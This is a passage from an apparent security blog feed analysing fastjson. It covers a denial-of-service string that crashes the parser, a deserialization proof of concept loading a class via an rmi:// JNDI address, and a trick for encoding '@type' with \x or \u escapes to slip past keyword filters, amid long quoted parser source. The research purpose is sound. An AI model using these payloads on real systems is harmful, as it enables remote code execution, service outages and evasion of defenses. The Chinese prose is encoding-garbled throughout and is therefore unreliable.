class="keyword">new</span> Thread(<span class="keyword">new</span> fastjsonDos()).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String DEATH_STRING = <span class="string">"&#123;\"a\":\"\\x"</span>;</span><br><span class="line">        JSON.parse(DEATH_STRING);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064077132.jpg" alt="-w882"></p><p>åæ¥å­¦ä¹ åˆ°ï¼Œjavaå¯åŠ¨çš„æ—¶å€™å¯ä»¥é€šè¿‡<code>-Xmx</code>å‚æ•°ä¸ºjvmè®¾ç½®æœ€å¤§å†…å­˜å ç”¨ï¼Œé»˜è®¤ä¸ºä¸»æœºçš„å››åˆ†ä¹‹ä¸€ã€‚</p><p>å…¶æ¬¡Javaçš„OutOfMemoryErroræ˜¯JVMå†…éƒ¨çš„å¼‚å¸¸ï¼Œæ˜¯ä¸€ä¸ªå¯æ•è·å¼‚å¸¸ï¼Œå¹¶ä¸ä¼šç›´æ¥å¯¼è‡´javaè¿›ç¨‹è¢«Killæ‰ï¼Œé¡¶å¤šçº¿ç¨‹æŒ‚æ‰ã€‚</p><p>åœ¨Linuxä¸‹å½“åº”ç”¨ç¨‹åºå†…å­˜è¶…å‡ºå†…å­˜ä¸Šé™æ—¶ï¼Œä¼šè§¦å‘Out Of Memory Killeræœºåˆ¶ä»¥ä¿æŒç³»ç»Ÿç©ºé—´æ­£å¸¸è¿è¡Œï¼Œjavaé»˜è®¤æœ€å¤§1/4ç‰©ç†å†…å­˜å ç”¨ï¼Œè¿˜ä¸å¤ªå®¹æ˜“å¯¼è‡´ç³»ç»Ÿçš„OOMã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œæ¼æ´å±å®³æœ‰é™ï¼Œä½†æ˜¯åˆ©ç”¨è¿‡ç¨‹è¿˜æ˜¯æŒºçœ‹ç»†èŠ‚çš„ï¼Œæœ‰ä¸€äº›å€¼å¾—å­¦ä¹ çš„ç‚¹~</p><p>å‚è€ƒæ–‡ç« ï¼š</p><ul><li><a href="https://zonghaishang.gitbooks.io/fastjson-source-code-analysis/content/lexer/lexer_part2.html" target="_blank" rel="noopener">fastjsonæºç è§£æï¼šJSON Tokenè§£æ</a></li><li><a href="https://nosec.org/home/detail/2933.html" target="_blank" rel="noopener">FastJsonæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ</a></li><li><a href="https://blog.csdn.net/liukuan73/article/details/43238623" target="_blank" rel="noopener">Linuxå†…æ ¸OOMæœºåˆ¶çš„è¯¦ç»†åˆ†æ</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="https://0day.design/tags/Java/"/>
    
      <category term="æ¼æ´åˆ†æ" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="fastjson" scheme="https://0day.design/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>fastjson ååºåˆ—åŒ–è§¦å‘æµç¨‹åˆ†æ</title>
    <link href="https://0day.design/2020/01/30/fastjson%20%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <id>https://0day.design/2020/01/30/fastjson è§¦å‘æµç¨‹åˆ†æ/</id>
    <published>2020-01-30T08:05:00.000Z</published>
    <updated>2020-03-19T12:47:56.506Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="Fastjson-ååºåˆ—åŒ–è§¦å‘æµç¨‹åˆ†æ"><a href="#Fastjson-ååºåˆ—åŒ–è§¦å‘æµç¨‹åˆ†æ" class="headerlink" title="Fastjson ååºåˆ—åŒ–è§¦å‘æµç¨‹åˆ†æ"></a>Fastjson ååºåˆ—åŒ–è§¦å‘æµç¨‹åˆ†æ</h1><p>è·Ÿäº†å‡ ä¸ªä¸‰æ–¹ç»„ä»¶ç»„åˆåˆ©ç”¨çš„gadget chainï¼Œä¸€ç›´æ²¡æœ‰å»è·Ÿfastjsonåº•å±‚å®ç°ï¼Œä¸å…æœ‰å¾ˆå¤šç–‘é—®ä¹‹å¤„ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹åˆ†æä¸€ä¸‹fastjsonè§¦å‘æµç¨‹ã€‚</p><h2 id="fastjson-1-2-61-ååºåˆ—åŒ–æ‰§è¡Œæµç¨‹åˆ†æ"><a href="#fastjson-1-2-61-ååºåˆ—åŒ–æ‰§è¡Œæµç¨‹åˆ†æ" class="headerlink" title="fastjson 1.2.61 ååºåˆ—åŒ–æ‰§è¡Œæµç¨‹åˆ†æ"></a>fastjson 1.2.61 ååºåˆ—åŒ–æ‰§è¡Œæµç¨‹åˆ†æ</h2><p>æ¥ç€ä¸Šä¸€ç¯‡æ–‡ç« <a href="https://xz.aliyun.com/t/7107" target="_blank" rel="noopener">fastjson 1.2.61 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ(commons-configuration gadget)</a>çš„pocå‡ºå‘ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String poc = <span class="string">"&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;"</span>;</span><br><span class="line">        ParserConfig.global.setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSONObject exp = (JSONObject) JSON.parseObject(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¸‹æ–­ç‚¹è·Ÿè¿›POCä¸­çš„<code>JSON.parseObject</code>å‡½æ•°ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362514.jpg" alt="-w1427"></p><p>è·Ÿè¿›<code>parse(String text)</code>å‡½æ•°ï¼Œä¸€é¡¿å¥—å¨ƒæ“ä½œ(javaçš„é‡è½½ç‰¹æ€§ï¼šå…è®¸å­˜åœ¨ç›¸åŒæ–¹æ³•åï¼Œä½†ä¸åŒå‚æ•°ä¸ªæ•°åŠç±»å‹)<br>é€šè¿‡é‡è½½çš„ç‰¹æ€§ï¼Œè°ƒç”¨äº†ä¸‰ä¸ª<code>parse</code>å‡½æ•°:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 148</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> parse(text, DEFAULT_PARSER_FEATURE);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 179</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text, <span class="keyword">int</span> features)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> parse(text, ParserConfig.getGlobalInstance(), features);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 164</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text, ParserConfig config, <span class="keyword">int</span> features)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        DefaultJSONParser parser = <span class="keyword">new</span> DefaultJSONParser(text, config, features);</span><br><span class="line">        Object value = parser.parse();</span><br><span class="line">        parser.handleResovleTask(value);</span><br><span class="line">        parser.close();</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>åœ¨<code>DefaultJSONParser</code>å‡½æ•°ä¸­åˆå§‹åŒ–äº†ä¸€äº›å˜é‡é…ç½®ä¿¡æ¯ï¼Œç¡®è®¤èµ·å§‹æ ‡å¿—ä½ä¸º<code>{</code>ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362533.jpg" alt="-w1223"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362541.jpg" alt="-w789"></p><p>æ¥ç€è¿›å…¥<code>parser.parse</code>å‡½æ•°ï¼Œè§£æjsonæµç¨‹:<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362549.jpg" alt="-w1057"></p><p>è·Ÿè¿›DefaultJSONParser.java#parseObjectï¼Œå‡½æ•°è¾ƒé•¿ï¼Œæˆªå–éƒ¨åˆ†ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                lexer.skipWhitespace();</span><br><span class="line">                <span class="keyword">char</span> ch = lexer.getCurrent();</span><br><span class="line">                <span class="keyword">if</span> (lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (ch == <span class="string">','</span>) &#123;</span><br><span class="line">                        lexer.next();</span><br><span class="line">                        lexer.skipWhitespace();</span><br><span class="line">                        ch = lexer.getCurrent();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">boolean</span> isObjectKey = <span class="keyword">false</span>;</span><br><span class="line">                Object key;</span><br><span class="line">                <span class="keyword">if</span> (ch == <span class="string">'"'</span>) &#123;</span><br><span class="line">                    key = lexer.scanSymbol(symbolTable, <span class="string">'"'</span>);</span><br><span class="line">                    lexer.skipWhitespace();</span><br><span class="line">                    ch = lexer.getCurrent();</span><br><span class="line">                    <span class="keyword">if</span> (ch != <span class="string">':'</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"expect ':' at "</span> + lexer.pos() + <span class="string">", name "</span> + key);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">'&#125;'</span>) &#123;</span><br><span class="line">                    lexer.next();</span><br><span class="line">                    lexer.resetStringPosition();</span><br><span class="line">                    lexer.nextToken();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!setContextFlag) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.context != <span class="keyword">null</span> &amp;&amp; fieldName == <span class="keyword">this</span>.context.fieldName &amp;&amp; object == <span class="keyword">this</span>.context.object) &#123;</span><br><span class="line">                            context = <span class="keyword">this</span>.context;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            ParseContext contextR = setContext(object, fieldName);</span><br><span class="line">                            <span class="keyword">if</span> (context == <span class="keyword">null</span>) &#123;</span><br><span class="line">                                context = contextR;</span><br><span class="line">                            &#125;</span><br><span class="line">                            setContextFlag = <span class="keyword">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> object;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">'\''</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!lexer.isEnabled(Feature.AllowSingleQuotes)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    key = lexer.scanSymbol(symbolTable, <span class="string">'\''</span>);</span><br><span class="line">                    lexer.skipWhitespace();</span><br><span class="line">                    ch = lexer.getCurrent();</span><br><span class="line">                    <span class="keyword">if</span> (ch != <span class="string">':'</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"expect ':' at "</span> + lexer.pos());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == EOI) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">','</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((ch &gt;= <span class="string">'0'</span> &amp;&amp; ch &lt;= <span class="string">'9'</span>) || ch == <span class="string">'-'</span>) &#123;</span><br><span class="line">                    lexer.resetStringPosition();</span><br><span class="line">                    lexer.scanNumber();</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_INT) &#123;</span><br><span class="line">                            key = lexer.integerValue();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            key = lexer.decimalValue(<span class="keyword">true</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (lexer.isEnabled(Feature.NonStringKeyAsString)) &#123;</span><br><span class="line">                            key = key.toString();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"parse number key error"</span> + lexer.info());</span><br><span class="line">                    &#125;</span><br><span class="line">                    ch = lexer.getCurrent();</span><br><span class="line">                    <span class="keyword">if</span> (ch != <span class="string">':'</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"parse number key error"</span> + lexer.info());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">'&#123;'</span> || ch == <span class="string">'['</span>) &#123;</span><br><span class="line">                    lexer.nextToken();</span><br><span class="line">                    key = parse();</span><br><span class="line">                    isObjectKey = <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!lexer.isEnabled(Feature.AllowUnQuotedFieldNames)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    key = lexer.scanSymbolUnQuoted(symbolTable);</span><br><span class="line">                    lexer.skipWhitespace();</span><br><span class="line">                    ch = lexer.getCurrent();</span><br><span class="line">                    <span class="keyword">if</span> (ch != <span class="string">':'</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"expect ':' at "</span> + lexer.pos() + <span class="string">", actual "</span> + ch);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></p><p>æ€»çš„æ¥è¯´å°±æ˜¯ä¸€ä¸ªå¤§å¾ªç¯ï¼Œé‡Œè¾¹åµŒå¥—äº†ä¸€å †if elseï¼Œç„¶åä¾æ®ç±»å‹æ¥åˆ¤æ–­ï¼Œç›´åˆ°è¿­ä»£å™¨éå†å®Œjsonæ•°æ®ä¸ºæ­¢ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªå°±æ˜¯æ£€æµ‹æ•°å­—çš„åˆ¤æ–­ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362557.jpg" alt="-w994"><br>å†æ¯”å¦‚è¿™é‡Œï¼ŒåŒ¹é…åˆ°åŒå¼•å·ï¼Œåˆ™ç”¨<code>lexer.scanSymbol</code>å‡½æ•°å»è·å–åŒå¼•å·ä¸­é—´çš„å€¼ï¼Œå¹¶è®¾ç½®é”®åï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362565.jpg" alt="-w1178"></p><p>å†æ¥çœ‹è¿™é‡Œï¼Œè¿›è¡Œäº†ç‰¹æ®Šé”®<code>@type</code>åŒ¹é…ï¼Œå¹¶ä¸”<code>!lexer.isEnabled(Feature.DisableSpecialKeyDetect)</code>é»˜è®¤ä¹Ÿæ˜¯<code>true</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362577.jpg" alt="-w1331"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362586.jpg" alt="-w900"><br>è·Ÿè¿›<code>lexer.scanSymbol(symbolTable, &#39;&quot;&#39;)</code>å‡½æ•°ï¼Œçœ‹çœ‹å®ƒæ˜¯å¦‚ä½•è·å–ç±»å‹å<code>typeName</code>çš„ï¼ŒJSONLexerBase.java#scanSymbolï¼ŒåŒæ ·çš„ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªè¿­ä»£åˆ¤æ–­çš„è¿‡ç¨‹ï¼Œè¿™é‡Œçœ‹ä¸€æ®µæ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯è¿™ä¸€æ®µä»£ç ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chLocal == <span class="string">'\\'</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!hasSpecial) &#123;</span><br><span class="line">                    hasSpecial = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (sp &gt;= sbuf.length) &#123;</span><br><span class="line">                        <span class="keyword">int</span> newCapcity = sbuf.length * <span class="number">2</span>;</span><br><span class="line">                        <span class="keyword">if</span> (sp &gt; newCapcity) &#123;</span><br><span class="line">                            newCapcity = sp;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">char</span>[] newsbuf = <span class="keyword">new</span> <span class="keyword">char</span>[newCapcity];</span><br><span class="line">                        System.arraycopy(sbuf, <span class="number">0</span>, newsbuf, <span class="number">0</span>, sbuf.length);</span><br><span class="line">                        sbuf = newsbuf;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// text.getChars(np + 1, np + 1 + sp, sbuf, 0);</span></span><br><span class="line">                    <span class="comment">// System.arraycopy(this.buf, np + 1, sbuf, 0, sp);</span></span><br><span class="line">                    arrayCopy(np + <span class="number">1</span>, sbuf, <span class="number">0</span>, sp);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                chLocal = next();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span> (chLocal) &#123;</span><br><span class="line">                         <span class="comment">// çœç•¥å¤§é‡case</span></span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'\\'</span>: <span class="comment">// 92</span></span><br><span class="line">                        hash = <span class="number">31</span> * hash + (<span class="keyword">int</span>) <span class="string">'\\'</span>;</span><br><span class="line">                        putChar(<span class="string">'\\'</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'x'</span>:</span><br><span class="line">                        <span class="keyword">char</span> x1 = ch = next();</span><br><span class="line">                        <span class="keyword">char</span> x2 = ch = next();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">int</span> x_val = digits[x1] * <span class="number">16</span> + digits[x2];</span><br><span class="line">                        <span class="keyword">char</span> x_char = (<span class="keyword">char</span>) x_val;</span><br><span class="line">                        hash = <span class="number">31</span> * hash + (<span class="keyword">int</span>) x_char;</span><br><span class="line">                        putChar(x_char);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'u'</span>:</span><br><span class="line">                        <span class="keyword">char</span> c1 = chLocal = next();</span><br><span class="line">                        <span class="keyword">char</span> c2 = chLocal = next();</span><br><span class="line">                        <span class="keyword">char</span> c3 = chLocal = next();</span><br><span class="line">                        <span class="keyword">char</span> c4 = chLocal = next();</span><br><span class="line">                        <span class="keyword">int</span> val = Integer.parseInt(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">char</span>[] &#123; c1, c2, c3, c4 &#125;), <span class="number">16</span>);</span><br><span class="line">                        hash = <span class="number">31</span> * hash + val;</span><br><span class="line">                        putChar((<span class="keyword">char</span>) val);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">this</span>.ch = chLocal;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"unclosed.str.lit"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p><p>è¿™æ®µä»£ç å¤„ç†äº†ä»¥<code>\x</code>å’Œ<code>\u</code>å¼€å¤´çš„16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ç”¨è¿™ç§æ–¹å¼å»ç¼–ç è½¬æ¢<code>typeName</code>ï¼Œä¹Ÿå°±æ˜¯<code>@type</code>çš„valueç»„ä»¶å<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362594.jpg" alt="-w1329"><br>å†éªŒè¯ä¸€ä¸‹è¿™ä¸ªç»“æœï¼Œå°†orgçš„oè¿›è¡Œç¼–ç ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362606.jpg" alt="-w1455"></p><p>å†è¯•è¯•å°†<code>@type</code>çš„<code>@</code>è¿›è¡Œç¼–ç éƒ½æ˜¯å¯è¡Œçš„<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362616.jpg" alt="-w1316"></p><p>å› ä¸ºåœ¨è·å–keyå€¼æ—¶ï¼Œä¹Ÿæ˜¯é€šè¿‡<code>lexer.scanSymbol</code>è·å–çš„(DefaultJSONParser.java#219è¡Œ)<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362623.jpg" alt="-w939"></p><blockquote><p>æ‰€ä»¥è¯´ï¼Œå¦‚æœåœ¨å¼€å‘ä»£ç ä¸­è¿‡æ»¤äº†å…³é”®å­—<code>@type</code>æˆ–è€…ç»„ä»¶åï¼Œå¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•è¿›è¡Œç»•è¿‡</p></blockquote><p>å…¶åï¼Œåœ¨å„ç§è§£ç æ“ä½œå®Œæˆä¹‹åï¼Œåœ¨DefaultJSONParser.java#327è¡Œå¯¹å…¶è¿›è¡Œäº†AutoTypeæ ¡éªŒï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362630.jpg" alt="-w1147"></p><p>ParserConfig.java#checkAutoType<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362641.jpg" alt="-w1322"><br>ç»è¿‡é•¿åº¦ã€é¢„æœŸclassã€æ˜¯å¦å¼€å¯autotypeç­‰åˆ¤æ–­åï¼Œè¿›è¡Œ<code>className</code>çš„hashè®¡ç®—ï¼Œå…ˆæœ‰ä¸€ä¸ªç™½åå•ï¼Œæ¥ç€åˆ¤æ–­æ˜¯å¦åœ¨é»‘åå•hashé‡Œã€‚</p><blockquote><p>ä¸ºäº†é˜²æ­¢å®‰å…¨ç ”ç©¶è€…ç ”ç©¶ï¼Œfastjson ä»1.2.42å¼€å§‹ï¼Œå°†æ˜æ–‡çš„é»‘åå•æ¢æˆäº†å“ˆå¸Œè¿‡çš„é»‘åå•ï¼Œä¸è¿‡githubä¸Šçš„å¤§ç‰›fuzzå‡ºäº†ä¸€ä»½æ¸…å•<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p></blockquote><p>åœ¨<code>TypeUtils.loadClass</code>ç¬¬ä¸‰ä¸ªå‚æ•°ä¸º<code>true</code>æ—¶ï¼Œä¼šç¼“å­˜åˆ°Mappingï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362653.jpg" alt="-w1354"><br><code>loadClass</code>å‡½æ•°ï¼Œç¬¬ä¸‰å‚æ•°ä¸º<code>cache</code>ä¸º<code>true</code>æ—¶ï¼Œåˆ™<code>mappings.put(className, clazz);</code>è¿›è¡Œç¼“å­˜ã€‚<br>TypeUtils.java#loadClass<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 